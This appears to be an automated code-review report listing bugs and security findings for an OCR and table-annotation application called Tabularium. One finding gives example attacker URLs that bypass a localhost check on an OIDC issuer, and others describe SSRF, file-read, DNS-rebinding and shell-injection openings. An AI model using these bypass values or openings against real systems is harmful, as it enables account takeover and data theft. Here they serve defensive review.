- **`backend/app/services/paddle_dataset.py:144-145`** (bug) — The COCO `file_name` is not relative to the dataset directory: `builder._page_image_path` returns the original absolute source path for `source_kind == "image"` (and an absolute path under `crops/` for rendered PDFs). The copy written to…
- **`backend/app/services/paddle_dataset.py:186-188`** (bug) — `unverified_skipped` is only incremented in the `approved_only` branch, so the manifest warning based on it can never fire in the `approved_only=False` build — precisely the mode where prefill text that nobody verified is written into `rec_train.txt` and…
- **`backend/app/services/paddle_dataset.py:199`** (performance) — This rescans the whole annotation list of the split for every page, making the loop O(pages x annotations). Count the annotations produced inside the annotation loop (increment the counter per page) and add it once, so the export stays linear on large…
- **`backend/app/services/paddle_official.py:0`** (bug) — Same gap as `parse_page`: `subprocess.TimeoutExpired` (and `OSError` when the runtime interpreter has disappeared since `paddle_runtime.ready()`) escapes unwrapped. Since this runs on the Xiaomi-OCR region path, the raw exception also skips the…
- **`backend/app/services/paddle_official.py:255-259`** (bug) — `subprocess.run` is given a timeout, but `subprocess.TimeoutExpired` (and `FileNotFoundError`/`OSError` from a stale `paddle_runtime.python_bin()`) is never caught here. Everything else in this function is converted into a friendly `RuntimeError`, so a…
- **`backend/app/services/paddle_official.py:267-269`** (bug) — Two robustness gaps here: 1. `.get("path", "")` assumes the last stdout line loads to a `dict`. If a dependency flushes a bare JSON scalar/array as the last line, this raises `AttributeError`, which is not in the `except` tuple, so it escapes as a raw…
- **`backend/app/services/paddle_runtime.py:56-57`** (bug) — `Path.write_text` truncates the file before writing, so the read-modify-write is not atomic: a `status()` call racing with the installer can read an empty/partial file, fall into the `except ValueError` branch of `status()` and report `state="absent"` —…
- **`backend/app/services/paddle_runtime.py:108-111`** (bug) — The wheel is chosen purely from the driver's CUDA version, which contradicts the rationale in the docstring: a Blackwell host whose driver advertises 12.8 (a very common state) falls into the `>= 12.6` branch and gets `cu126`, while the docstring states…
- **`backend/app/services/paddle_runtime.py:169-172`** (bug) — `ensure_ready()` is invoked from a background thread per adapter (`model_registry.ensure_runtime_async` starts one thread per adapter_id and `_RUNTIME_ACTIVE` is keyed by adapter, not by runtime). Since several adapters share the paddle runtime…
- **`backend/app/services/paddle_runtime.py:187-188`** (bug) — `state="installing"` is persisted before `log_path().open("ab")`, and the `open()` itself sits outside the guarded `try/except`. If the log cannot be opened (permissions, full disk, file locked on Windows) the exception escapes as a raw `OSError` and the…
- **`backend/app/services/paddle_runtime.py:196-197`** (bug) — When the override is set, the `paddleocr[doc-parser]` installation is skipped entirely, so unless the operator also lists it in `TABULARIUM_PADDLE_PACKAGES` the final `from paddleocr import PaddleOCRVL` check fails and the whole install is marked `failed`…
- **`backend/app/services/page_work.py:100`** (performance) — `ready()` runs `compute_readiness`, which loads every block of the page and parses each table grid, while the `BEGIN IMMEDIATE` RESERVED lock acquired at the top of `submit` is still held. SQLite allows a single writer, so every concurrent…
- **`backend/app/services/pages.py:348-350`** (bug) — The cached tile is returned before any invalidation check, and the cache key (page id + level + x/y, plus `_level.jpg`) does not include `TRANSFORM_VERSION` or the transform identity. If the master is swapped or a transform becomes invalid without going…
- **`backend/app/services/pages.py:429-432`** (bug) — The `try` only guards `json.loads`, but a stored value of `'null'` (or another valid non-list JSON such as `'3'`) parses without error into `None`/int, and the following `len(points)` raises an uncaught `TypeError`, turning a readiness check into a 500…
- **`backend/app/services/pages.py:615`** (bug) — Two fragile assumptions here: (1) `settings.get('study_protocol', {})` can legitimately be `None`, a list or a string (settings JSON is user-editable and `settings_json` only guarantees the top-level object), so `.get(...)` may raise `AttributeError`; (2)…
- **`backend/app/services/pipeline.py:55-56`** (bug) — Validation is only based on truthiness: whitespace-only ids (e.g. `" "`) pass, and any arbitrary `kind` string (e.g. `"exproter"`) is accepted even though `kind` is the field used to dispatch/list plugins by category. Normalize the id and restrict `kind`…
- **`backend/app/services/pipeline.py:57-58`** (bug) — Duplicate plugin ids are silently overwritten: registering an adapter with an id that already exists (e.g. a typo such as "builtin-scan ") makes the previously registered/built-in descriptor unreachable with no error or warning. Since `register_plugin` is…
- **`backend/app/services/prefill.py:374-376`** (bug) — `_dedupe_model_items` deliberately keeps items whose `bbox` is missing or not a 4-element sequence (see `domain/prefill.py`), and nothing guarantees a `label` key on native-runner output. Here `_scale_bbox` unpacks exactly four values and `item["label"]`…
- **`backend/app/services/process_probe.py:77-82`** (bug) — The two platform branches do not return the same shape for the same situation: here the trailing NUL becomes a trailing space and an empty `/proc/<pid>/cmdline` (kernel threads, zombies) yields `""`, while the macOS branch strips the output and maps empty…
- **`backend/app/services/project_members.py:36-40`** (bug) — The project (and therefore `owner_id`) is read on its own connection *before* the write transaction is opened. Concurrent requests run in the FastAPI threadpool, so between `projectstore.get()` and `writer.put_member()` a `transfer_owner` call can make…
- **`backend/app/services/project_members.py:78-79`** (bug) — `transfer_owner` also branches on the `owner_id` snapshot taken before the transaction. A concurrent transfer can make `old_owner` stale, so this code overwrites the newer owner with `set_owner()` and demotes the wrong user to `editor`, and the audit…
- **`backend/app/services/project_members.py:81-82`** (bug) — The previous owner is re-added as `editor` without checking `target`-style active status, which contradicts the rule stated in this module's docstring ("only an active account can be added"). A deactivated account therefore regains read/write membership on…
- **`backend/app/services/recognition.py:220-227`** (bug) — `_ACTIVE[run_id]` is registered before the thread is started, but if `Thread.start()` raises (e.g. `RuntimeError: can't start new thread` under resource pressure) the entry is never removed. The run also stays `queued` in SQLite with no worker. The leaked…
- **`backend/app/services/recognition.py:260-268`** (performance) — Every emitted block re-serialises the *whole* accumulated `blocks` list into `result_json` and writes it to SQLite. On OCR pages with hundreds of text regions this is O(n²) JSON work plus one full-row write per block (hundreds of KB rewritten per page).…
- **`backend/app/services/recognition.py:321-324`** (bug) — Both early exits here happen *before* the `try/finally` that pops `_ACTIVE`, so the entry leaks permanently (it is only removed in the worker's `finally`). `items_for_run()` on the next line can also raise (DB error) with the same effect. A leaked entry…
- **`backend/app/services/recognition.py:385-389`** (bug) — The resource identity used to stop the cloud instance is read from the *live* inference config at release time, not from what the run actually used (the run row has no `resource_id`). If the user reconfigures the endpoint (new Vast instance, switch to…
- **`backend/app/services/recognition.py:406-407`** (performance) — `get_run()` defaults to `results="all"`, which builds every item dict and `json.loads` every `result_json` (documented as up to 4.7 MB for 200 pages). Here only `state` is needed. The call is also duplicated: the early `return run` and the final `return…
- **`backend/app/services/recognition.py:417-418`** (performance) — Same issue as in `cancel_run`: the run is loaded with `results="all"` (all pages plus parsed `result_json` for every page) only to read `state`, `engine`, `mode`, `model_mode`, `stop_policy` and the per-item `state`/`page_id`. Call `get_run(run_id,…
- **`backend/app/services/remote_eval.py:53-55`** (bug) — On timeout the code calls `terminate()` and raises immediately without `wait()`/`kill()`. Only the local ssh client is signalled; the remote pip/venv process keeps running and can hold `/opt/tabularium/eval-venv`, so a retry races with the orphaned…
- **`backend/app/services/remote_eval.py:188-189`** (bug) — `lang` is accepted and required by both call sites (`cfg["lang"]` / `'en'`) but never used in this function; table scoring in `training_comparison.score_validation` always passes `lang='en'`. Either thread `lang` through to the table metrics or drop the…
- **`backend/app/services/remote_eval.py:214`** (bug) — `splitlines()[-1]` raises `IndexError` when the resolve command exits 0 but prints nothing, bypassing the intended `Unable to resolve base checkpoint` error path (the analogous `server_pid` parse above is already guarded). Guard against empty output and…
- **`backend/app/services/scan.py:50-53`** (maintainability) — The `conn` parameter is never used: the body ignores it and `pagestore.existing_paths(project_id)` opens its own connection via `connect()`. That contradicts the "the scan owns one connection" contract stated in `run_scan` and opens a second connection…
- **`backend/app/services/scan.py:158-161`** (bug) — `rel_archive` resolves `archive_dir` but not `path`, yet `scan_archive` builds candidates from the *unresolved* `root` (`Path(archive_dir) / ...`). When `archive_dir` is relative, or contains a symlink/`..`/non-normalized segment, `relative_to()` raises…
- **`backend/app/services/scan.py:232-234`** (performance) — The PDF branch renders every page at 200 DPI *before* `insert_pdf_page` can tell it is a duplicate, so any rescan of a project that already contains PDFs re-renders (and re-thumbnails) the whole archive to re-discover the same rows. On a large archive each…
- **`backend/app/services/scan.py:281-283`** (bug) — `run_scan` never checks that `root` exists/is a directory. `Path.rglob()` on a missing path yields nothing, so `find_missing_page_ids` reports every stored page as missing and, with `confirm_missing=True`, `mark_missing_pages` hides the whole project. The…
- **`backend/app/services/scan.py:288-289`** (performance) — The whole registration loop runs inside the single `with connect()` block, so the SQLite write transaction stays open for the entire scan (potentially minutes of PDF rendering). In WAL mode there is a single writer: every other write in the app…
- **`backend/app/services/security.py:15`** (security) — The KDF parameters are not stored alongside the digest: `hash_password` writes `salt`/`password_hash` only, so raising `PBKDF2_ITERATIONS` later makes every existing hash unverifiable (all logins fail with 401) with no way to distinguish old from new rows…
- **`backend/app/services/security.py:22`** (bug) — The docstring promises a new salt only when `salt is None`, but the truthiness test also discards an empty string (and `bytes.fromhex("")` would yield a zero-length salt anyway, which is never a valid stored value). A caller passing `""` by mistake…
- **`backend/app/services/security.py:35`** (bug) — `verify_password` assumes the stored material is well-formed: `bytes.fromhex(salt_hex)` raises `ValueError` on non-hex/odd-length input and `TypeError` when the column is `NULL`, and `compare_digest` raises `TypeError` if `hash_hex` is not ASCII.…
- **`backend/app/services/serve_manager.py:118-119`** (bug) — Every `HTTPError` is treated as "server is up", including 500 and 503. vLLM answers 503 while it is still loading or when it can no longer serve, so `progress()`/`get_status()` will report `phase == "ready"` for a server that is failing. Restrict the…
- **`backend/app/services/serve_manager.py:365-369`** (bug) — `_died_before_serving()` is true for *any* exit before `/v1/models` answers (bad flag, OOM unrelated to the draft, missing CUDA kernel, crash in the draft model, …), but the persisted verdict always blames VRAM. A transient or unrelated failure therefore…
- **`backend/app/services/serve_manager.py:484`** (security) — `"serve.py" in cmdline` matches any user process whose path merely contains `serve.py` (e.g. `/home/user/project/serve.py`). Since a match here leads `_reclaim_port()` to SIGTERM/SIGKILL the holder, an unrelated process the user left on the configured port…
- **`backend/app/services/serve_manager.py:921-923`** (bug) — `stop()` has no effect on an in-flight startup: it only looks at `_ACTIVE_PROC`/`_ACTIVE_INFO`, while the reservation in `_STARTING_INFO` keeps its worker alive, which will call `start()` and launch a server after the user asked to stop it. Add a…
- **`backend/app/services/settings.py:68`** (bug) — `bool()` on the incoming value turns any truthy non-boolean into `True`: a payload like `{"allow_registration": "false"}` (string, or `"0"`, or a non-empty list) silently *enables* open registration instead of disabling it. This flag gates sign-up, so a…
- **`backend/app/services/settings.py:74-78`** (bug) — The vault is mutated (`put`/`delete`) before the issuer, client_id, scopes and allowed-domain validations run. Any later `ValueError` aborts the save with the settings JSON untouched but the secret already overwritten or deleted — leaving partial,…
- **`backend/app/services/settings.py:83`** (security) — The `http://` exemption uses substring matching on the whole URL, so it is trivially bypassed by any host containing `localhost` or `127.0.0.1` (e.g. `http://localhost.attacker.example` or `http://evil.example/?localhost`). Since the issuer is where the…
- **`backend/app/services/settings.py:93-94`** (bug) — If `oidc_allowed_domains` is neither a string nor an iterable of values (e.g. the admin sends `null`, or a number / an old stored scalar), iterating it raises `TypeError` (or iterates dict keys), producing a 500 instead of a validation error.…
- **`backend/app/services/table_checks.py:57`** (bug) — Only mixed fractions with a whole part are matched. `_STACKED` rewrites `⁹⁄₂₀` to ` 9/20`, which after `strip()` no longer matches this regex, and the later `digits.isdigit()` rejects the slash, so a stacked/typed fraction without a whole part (`9/20`,…
- **`backend/app/services/table_checks.py:90`** (bug) — `if m else 0` only guards an empty row list, not a grid with rows but zero columns. `find_checks` returns early only for `not m`, so a grid such as `{"rows": 3}` (or any grid whose first row is empty) reaches `max(range(0))` and raises `ValueError: max()…
- **`backend/app/services/table_checks.py:213`** (bug) — The quantity-column window is a hard-coded five columns (`lab + 2 .. lab + 6`). For a table whose «QUANTITIES» section covers a different number of year columns, the first VALUE column falls inside this window, so `weights` converts it into the total's…
- **`backend/app/services/table_checks.py:338-339`** (bug) — The `or one` fallback contradicts the documented tier 2 («fra quelle che nessuna somma giusta garantisce, se ce ne sono») and the guarantee stated in `check_grid` («Una somma che torna fa da garante per le sue celle»): when every one-digit candidate is…
- **`backend/app/services/table_detect.py:267`** (bug) — The glyph rejection cap is tied to the crop height, so it rejects legitimate glyphs on short crops: with 27–30 px glyphs (the value documented for the corpus) any crop shorter than ~270–300 px fails `h <= height // 10`, `_glyphs` returns empty and…
- **`backend/app/services/table_detect.py:583`** (maintainability) — `occupied` is computed for every band and then never used — the only call site discards it (`xprof, _ = _shear_profiles(...)`), and the gutters are derived from `xprof` (total ink) instead. So the criterion the docstring of `_shear_profiles` describes ("un…
- **`backend/app/services/table_detect.py:589`** (bug) — With one or two row bands nothing can ever be `solid`: `xprof` is an ink count per column summed over `n_rows`, so its maximum is `n_rows`, while the threshold is at least 2.0. For `n_rows` 1–2 `_column_bounds` returns early with `"nessun contenuto"`,…
- **`backend/app/services/table_detect.py:725`** (bug) — `previous` starts at 0 and the candidate filter has no lower/upper bound of its own, so an internal boundary may be snapped into the left (or right) margin white run, and consecutive boundaries are not constrained against the *next* prior — one boundary…
- **`backend/app/services/table_hint.py:16`** (maintainability) — `MAX_LENGTH` is declared here but never referenced anywhere in the codebase (only definition, no imports). The actual limit is enforced by a duplicated literal `max_length=2000` in `TableHintIn` (`backend/app/schemas.py:538`). Two independent sources of…
- **`backend/app/services/table_hint.py:28`** (bug) — `str(value or "")` silently coerces any non-string input instead of rejecting it: a dict/list/number coming from a JSON settings payload becomes its `repr` (e.g. `"{'year': 1}"`), and a falsy-but-meaningful value such as `0` silently becomes an empty hint…
- **`backend/app/services/table_provenance.py:8`** (maintainability) — The classifier only recognises the prefixed form `model:<model>:<mode>`, but `api/blocks.py:520` already produces the plain value `"model"` for model-filled tables. If such a value ever reaches a persisted block, every cell is silently labelled…
- **`backend/app/services/table_provenance.py:15`** (bug) — The legacy default ignores the project-wide convention that an **empty** cell is verified because there is nothing to check: both producers set `"verified": not (c.get("text") or "").strip()` (`api/blocks.py:530`, `services/prefill.py:126`), and…
- **`backend/app/services/trainer.py:265`** (bug) — `preflight` is documented to return errors/warnings instead of raising, but a truncated or malformed `report.json` (it is written by a previous job and can be partial) makes `json.loads`/`read_text` raise `ValueError`/`OSError` straight out of `preflight`,…
- **`backend/app/services/trainer.py:273`** (bug) — `family_counts` is built only from `recipe_families`, so this indexing raises `KeyError` for any recipe whose `families` omits `table` (the declared families are per-spec data, e.g. a layout-only model, and `RECOGNITION_FAMILIES`/`ALL_FAMILIES` are not…
- **`backend/app/services/trainer.py:492`** (bug) — `_ACTIVE` is mutated and read from several threads (`start_run`/`stop_run` in the request thread, `_monitor` and `_metrics_writer` in daemon threads) with no lock: `_monitor` pops the entry while `start_run` may already have replaced it with a new run for…
- **`backend/app/services/trainer.py:694-695`** (bug) — When `download_artifacts` failed (or the process produced nothing), the local `checkpoints/` dir is empty or partially populated; the freshly written local manifest then verifies as `{"ok": True, "checked": 0}`, so `meta["artifacts"]` claims success while…
- **`backend/app/services/trainer.py:923-927`** (bug) — Any exception from `executor_from_config`/`recover` (including a transient SSH timeout or DNS hiccup) is swallowed and immediately marks the job `failed`, permanently forgetting a training session that may still be running on the host. Distinguish…
- **`backend/app/services/trainer_metrics.py:68`** (bug) — The `step` and `lr` patterns lack the `(?<![\w])` guard that the `loss` pattern uses, so they match suffixes of longer keys. A line such as `max_steps: 1000` / `logging_steps: 10` is not matched (a letter follows `step`), but `min_lr: 1e-6` or `warmup_lr:…
- **`backend/app/services/trainer_metrics.py:109`** (performance) — This reads and decodes the entire `train.log` into memory only to keep the last 20000 lines. It is called from the status endpoint polling path (`_metrics`, `_monitor`), so on long runs the whole file is re-materialised on every poll. `_log_tail` right…
- **`backend/app/services/trainer_script.py:132-133`** (bug) — The validated `train_type` is not written into `effective`, and `DEFAULTS` already carries `"train_type": "lora"`. Every generator therefore re-derives the type from `effective` (falling back to `"lora"`, or `"full"` in the PaddleFormers branch), instead…
- **`backend/app/services/trainer_script.py:215`** (security) — `gpus` is a free-text config field (a plain `<input>` in the UI) interpolated raw inside double quotes into the generated bash. On local runs preflight happens to reject unknown GPU ids, but on remote executors (`ssh`/`vast`/`runpod`) nothing validates it,…
- **`backend/app/services/trainer_script.py:316`** (bug) — This line unconditionally overwrites the destination computed by `_output_dir`, which already honours an explicit `cfg['output_dir']`. On a remote executor a user-supplied output directory is therefore silently ignored (locally it is respected). Keep the…
- **`backend/app/services/trainer_script.py:541-542`** (bug) — `run_path` prefixes `$RUN_DIR/` to every remote value, including an explicit absolute `output_dir` supplied by the user, producing `"$RUN_DIR//data/ckpt"` — an invalid destination. Prefix only relative values and pass absolute ones through unchanged.
- **`backend/app/services/training_executor.py:77-84`** (maintainability) — The log file is opened inline as `Popen(stdout=...)` and never bound to a variable, so the descriptor is only closed when CPython happens to drop the last reference; on the error path (missing `bash`, `Popen` raising) the handle lifetime is left to the GC…
- **`backend/app/services/training_executor.py:280-285`** (bug) — On `TimeoutExpired` the code parses whatever bytes were buffered in `exc.stdout`. If the PID line was not flushed yet, `splitlines()[-1]` is either empty or a partial line, and the resulting `RuntimeError` is raised *after* `nohup setsid ... &` may already…
- **`backend/app/services/training_executor.py:362-363`** (bug) — `_sync_log()` rewrites the local log in place with `write_text`, which truncates then writes. `poll()` is driven by the monitor thread (`wait()` loops every second) while `_metrics_writer` concurrently reads the same file with…
- **`backend/app/services/training_executor.py:423-428`** (bug) — Once the remote PID is gone and `.exit_code` is still missing, `poll()` unconditionally fabricates `returncode = 1` after 60s and caches it forever. Two problems: (a) a run that actually finished successfully but whose wrapper flush was interrupted…
- **`backend/app/services/training_executor.py:439-440`** (bug) — `_remote()` has a 20s timeout and can raise `OSError`/`subprocess.SubprocessError` (notably `TimeoutExpired`), but `terminate()`, `kill()` and `cleanup()` call it unguarded even though they are best-effort teardown operations. A transient network failure…
- **`backend/app/services/training_executor.py:475`** (bug) — `cfg.get("ssh_port", 22)` only falls back to 22 when the key is absent: an explicit `"ssh_port": None` (which the config dict accepts — `trainer.py` guards the same value with `int(cfg.get("ssh_port") or 22)`) makes `int(None)` raise `TypeError` here,…
- **`backend/app/services/unlimited_ocr_mlx_server.py:45-46`** (security) — Any non-data URL is forwarded verbatim to `load_image`, which fetches `http(s)` URLs and reads local paths. Combined with the configurable `--host`, a caller that can reach this port gets arbitrary local file reads (any path readable by the runtime user,…
- **`backend/app/services/unlimited_ocr_mlx_server.py:64-65`** (bug) — `part.get("type")` assumes every element of `content` is a dict. A syntactically valid request with a plain string (or number) inside `content`, or an `input_image` part whose `image_url` is a dict (as in some OpenAI-compatible clients), raises…
- **`backend/app/services/unlimited_ocr_mlx_server.py:182`** (bug) — `(body.get("stream_options") or {})` only guarantees a dict when the value is falsy; a truthy non-dict (e.g. `"stream_options": true`) makes `.get("include_usage")` raise `AttributeError` and the endpoint returns 500. Guard with `isinstance(..., dict)`.
- **`backend/app/services/unlimited_ocr_mlx_server.py:188-189`** (bug) — The same pattern exists in the non-streaming branch: `release_memory()` after the loop is skipped whenever `generate()` raises, leaving the MLX cache uncleared until the next successful page. Put the cleanup in a `finally` block.
- **`backend/app/services/unlimited_ocr_mlx_server.py:230-231`** (bug) — `release_memory()` is only reached on normal generator exhaustion. If `stream_generate` raises (Metal fault, OOM, decode error) or the SSE client disconnects (`GeneratorExit` while yielding), the MLX cache and peak counters are never cleared — exactly the…
- **`backend/app/services/url_security.py:21-22`** (bug) — `rstrip("/")` removes *all* trailing slashes on every path, so `https://host/api/` is returned as `https://host/api`. Trailing slashes are significant for many HTTP servers/APIs (redirects, 404s, base-path handling), so normalization can break a previously…
- **`backend/app/services/url_security.py:22`** (security) — TOCTOU/DNS-rebinding window: the hostname is resolved here only to validate it, but the original hostname (not the validated IP) is returned, so the downstream HTTP client re-resolves it at request time. An attacker-controlled DNS record can answer with a…
- **`backend/app/services/users.py:73-74`** (security) — `email` is stored verbatim and never checked for uniqueness, yet `ensure_oidc_user` binds OIDC identities to accounts by email through `accountstore.by_email` (a `SELECT ... WHERE lower(email)=?` with no ordering and no UNIQUE constraint on the column).…
- **`backend/app/services/users.py:113-114`** (bug) — The email is saved verbatim (no lowercasing, no trim) and without a uniqueness check, while `ensure_oidc_user`/`accountstore.by_email` treat email as an identity key (case-insensitive lookup, no tie-break). An admin can therefore create/assign an email…
- **`backend/app/services/users.py:158-163`** (bug) — Only `ValueError` is caught. If the stored value parses to a *naive* datetime (no offset — e.g. a row written by a manual fix, a script, or a legacy record), the comparison against the aware `datetime.now(timezone.utc)` raises `TypeError` (can't compare…
- **`backend/app/services/users.py:173-174`** (bug) — Check-then-act on the invite: `find_by_invite` reads the token in one statement, and the token is only cleared afterwards. Two concurrent POSTs to `/api/auth/invite/accept` with the same link can both see a valid token and both call `set_password`, so the…
- **`backend/app/services/users.py:213`** (bug) — `normalize_username` never returns a falsy value: it raises `HTTPException(422)` when the name is shorter than 3 characters or contains disallowed characters. So the `or "utente"` fallback is dead code, and an OIDC user whose provider label is 1–2 chars…
- **`backend/app/services/vault.py:71`** (other) — `get()` is documented/called as a lookup that returns `""` when the ref does not resolve to a readable secret, but a syntactically invalid ref (e.g. `"vault:"`, `"vault: "`, or a ref with characters outside `_NAME`) raises `ValueError` out of it. Not every…
- **`backend/app/services/vault.py:76-78`** (bug) — The `try` here only guards decoding errors, but `_fernet()` is invoked inside it and raises `RuntimeError` when `TABULARIUM_VAULT_KEY` is not set or `cryptography` is missing. That exception escapes `get()`, so the documented "absent secret" contract…
- **`backend/app/services/vendor_repos.py:31-33`** (bug) — The check-then-act on `target` is not atomic and the clone writes directly into the final path: if two `start()` calls run at the same time (the only current caller, `serve_manager.start_async`, is single-flight, but `start()` is public and also invoked…
- **`backend/app/services/vendor_repos.py:37`** (security) — The clone is pinned neither to a tag nor to a commit SHA: `--depth 1` on the default branch downloads whatever upstream `main` contains at that moment, and `serve_manager` then executes `parsing/serve.py` from that checkout. A…
- **`backend/app/services/vendor_repos.py:47-50`** (bug) — Only `CalledProcessError` and `TimeoutExpired` are translated into the intended contextual `RuntimeError`. If `git` is not installed, `subprocess.run` raises `FileNotFoundError`, and permission/disk errors raise `OSError` from both `subprocess.run` and the…
- **`backend/app/services/vendor_repos.py:48-51`** (bug) — Success of `git clone` is not validated: the function returns `target` even if the checkout does not contain `parsing/serve.py` (upstream layout change, redirected repo, empty clone, or a clone that is interrupted right after git creates the directory).…
- **`backend/tests/conftest.py:76-78`** (bug) — Cookies are only ever added or overwritten; a `Set-Cookie` that deletes the cookie (`Max-Age=0`/`Expires` in the past, as sent by `/api/auth/logout`) leaves the stale entry in `self.cookies`, which keeps sending `cookie: tab_session=<old token>` on…
- **`backend/tests/conftest.py:82`** (bug) — `asyncio.run` creates and closes a fresh event loop per request and raises `RuntimeError: asyncio.run() cannot be called from a running event loop` if the client is ever used from async test code/plugin. Combined with the per-request lifespan above, every…
- **`backend/tests/conftest.py:103`** (maintainability) — `stream()` performs a fully buffered request (`self.request(...)`) and yields the completed response, so the SSE tests (`test_prelabel.py` reading `response.iter_lines()`) never exercise incremental streaming: the whole body is materialised before the…
- **`conf/profiles/shipping-registers-1900s.json:23`** (bug) — `default_objective` is `"tables"`, but the profile itself declares that the `voyage-supplement` genre is *not* a table (`"table_format": null`). A downstream consumer that seeds the project/study objective from this value would ask for tables on exactly…
- **`conf/profiles/shipping-registers-1900s.json:24`** (bug) — The `conventions` and `labels` fields use bare-string shapes, but the per-project contracts are `list[ConventionItem]` (`id`, `label`, `checked`, with stable ids such as `soft_hyphen`, `sigle`, `colonne_fantasma`, `filetti`) and `LabelDef` (`name`,…
- **`conf/profiles/shipping-registers-1900s.json:35-36`** (maintainability) — Nothing in the codebase reads `default_objective`, `page_types`, `conventions`, `labels`, `recommended_split` or `recommended_language`: `domain_profiles.list_profiles()` returns the raw dict and only `id` / `legacy_ids` are consumed (`canonical_id`,…
- **`frontend/index.html:28`** (bug) — The body contains only an empty `#root`, so any failure in the bootstrap chain (module 404, syntax error in `main.tsx`, unsupported browser, JS disabled) leaves the user with a completely blank white page and no explanation. Add a `<noscript>` notice and a…
- **`frontend/package.json:5`** (maintainability) — The manifest declares neither the Node requirement (`engines` / `packageManager`) nor the Python prerequisite used by the `test:e2e:*` scripts, even though both are hard requirements: `vite@8` and `@vitejs/plugin-react@6` require `^20.19.0 || >=22.12.0`,…
- **`frontend/package.json:16`** (bug) — `tsc --noEmit` does not follow project references, so this script only checks `src` (tsconfig.json) and silently skips `tsconfig.node.json` (i.e. `vite.config.ts`). Type errors in the Vite config only surface later during `npm run build` (`tsc -b && vite…
- **`frontend/package.json:38-39`** (bug) — Two dependencies are only present transitively and should be declared explicitly. `@types/node` is needed because `tsconfig.node.json` type-checks `vite.config.ts`, which uses `process.env.TABULARIUM_API` / `process.env.TABULARIUM_BASE_PATH`, but it…
- **`frontend/src/index.css:296-298`** (bug) — The base field border uses `--color-rule` (#e5e3e1) on a white sheet: about 1.2:1 contrast, far below the 3:1 that WCAG 1.4.11 requires to identify a control boundary. The border only becomes visible on hover/focus, so an unfocused field is nearly…
- **`frontend/src/index.css:493-496`** (bug) — `display: none` removes the page name and the shortcut keys from the accessibility tree entirely, which contradicts the comment right above ("Le parole tolte restano ai lettori di schermo e nel titolo al passaggio") and the technique used for steps 3–5 in…
- **`frontend/src/index.css:684`** (maintainability) — This whole `jss_*` skin targets Jspreadsheet CE, which is no longer a dependency (`frontend/package.json` only declares Univer) and no component in `frontend/src` renders a `tabularium-sheet` container. Keeping ~55 lines of library-specific overrides that…
- **`frontend/src/index.css:968-973`** (maintainability) — `@keyframes reveal` is never referenced anywhere in the file (no `animation: reveal ...`), and the reduced-motion block still disables an animation on `main .mod` that this stylesheet never sets. Either the rule that applied `reveal` was dropped (in which…
- **`frontend/src/index.css:998-1001`** (bug) — Making the *default* state invisible means the content is only visible if a listener installed in `main.tsx` happens to run and if the `load`/`error` event is caught. Any path where that listener is absent (unit tests with jsdom, a different entry point, a…
- **`frontend/tsconfig.json:20`** (bug) — `npm run build` uses `tsc -b`, which will also build the referenced project. `tsconfig.node.json` sets `composite: true` but neither `noEmit` nor an `outDir`, so the build emits `vite.config.js` / `vite.config.d.ts` next to the source. That pollutes the…
- **`scripts/benchmark_dewarp.py:39-40`** (bug) — There is no per-image isolation: an unreadable/corrupt image, a failing transform or an OCR exception aborts the whole corpus, and because `report.json` is only written after the loop finishes, every measurement already collected is lost. Wrap the body of…
- **`scripts/benchmark_end2end.py:44-45`** (maintainability) — Catching every exception and returning `None` makes a genuine OTSL/HTML parse failure indistinguishable from a non-table item (both yield `table_shape: null`), so a regression in table parsing would look like "no tables on this page" in the benchmark…
- **`scripts/benchmark_end2end.py:112-113`** (bug) — On the failure path `client.last_trace` / `client.last_text` are not reset per call: `VllmClient` only overwrites them inside `_chat` after a successful request. If `end2end` raises before any token is produced (pixel resizing, connection error, timeout on…
- **`scripts/benchmark_end2end.py:122`** (maintainability) — `main` always returns 0, even when every page failed (`immagine non disponibile`) or every inference call raised. An automated benchmark run therefore cannot distinguish total failure from success. Compute the exit code from `report["results"]` (e.g.…
- **`scripts/build_frontend.ps1:3`** (bug) — `Set-Location` mutates the process-wide current directory and is never restored. When this script is dot-sourced or called in-session (as `scripts/run.ps1` does), the caller keeps running from `frontend`, so any relative path used afterwards resolves…
- **`scripts/run.ps1:7`** (bug) — The `.prebuilt` marker short-circuits the `frontend\dist\index.html` existence check entirely, so a partially cleaned/unpacked `dist` (marker present, assets missing) is never detected: uvicorn starts and serves a broken frontend with no diagnostic. At…
- **`scripts/run.ps1:16`** (bug) — `-ErrorAction SilentlyContinue` hides a missing/unreadable input path: if `frontend\src` (or any other entry in `$inputs`) no longer exists, `Get-ChildItem` emits an error that is suppressed, `$newer` stays `$null` and `$needsBuild` becomes `$false`, so…
- **`scripts/run_backend.ps1:4-5`** (bug) — Two problems here compared to `scripts/run_backend.sh`, which sources `<repo>/.env` (lines 6-10) before reading these same variables: 1. On Windows the `.env` file is never loaded, so `TABULARIUM_HOST`/`TABULARIUM_PORT` set there are silently ignored by…
- **`scripts/run_frontend.ps1:3`** (maintainability) — Two robustness issues with this line: (1) `Join-Path $PSScriptRoot ...` yields `$null`/empty when the script body is piped or invoked as a block (e.g. `Get-Content scripts/run_frontend.ps1 | Invoke-Expression`), and then `Set-Location $null` silently moves…
- **`scripts/setup_backend.ps1:13`** (bug) — `Test-Path ".venv"` only proves a directory exists. A venv left over from a failed run, created on another OS (`.venv/bin/python`, e.g. a folder moved from WSL/Linux) or built with a different/unsupported Python is accepted without validation, so creation…
- **`scripts/setup_backend.ps1:23`** (bug) — Functional gap versus `scripts/setup_backend.sh`: the shell installer generates `TABULARIUM_VAULT_KEY` in the repo `.env`, but this script never does. From a checkout `config.ensure_vault_key()` returns immediately when `INSTALLED` is false (see…
- **`scripts/setup_frontend.ps1:3`** (bug) — The target directory and the prerequisites of `npm ci` are never validated. `npm ci` requires both `frontend/` to exist and `frontend/package-lock.json` to be present (it refuses to run without a lockfile); when either is missing the failure surfaces as an…
- **`scripts/test_backend.ps1:2`** (bug) — `Set-Location` mutates the process-wide location and it is never restored. Because `& script.ps1` runs in a child *scope* of the same runspace, the caller's working directory stays on `backend` after the script returns (and also after a pytest failure or…

Full text and suggestions for these 332 findings are in the JSON export.

## Low — 141

- **`backend/app/adapters/annotations.py:151-152`** (maintainability) — `commit()` has no caller anywhere in the codebase: `writing()` already commits when the `with connect()` block exits normally. Keeping an unused write API on the writer invites a caller to commit mid-transaction and break the all-or-nothing guarantee the…
- **`backend/app/adapters/blocks.py:54-58`** (performance) — The delete is done in three round trips: fetch every block id into Python, count the grids with an `IN (?,?,...)` list, then delete with the same list. Building the placeholder list from `ids` also risks `sqlite3.OperationalError: too many SQL variables`…
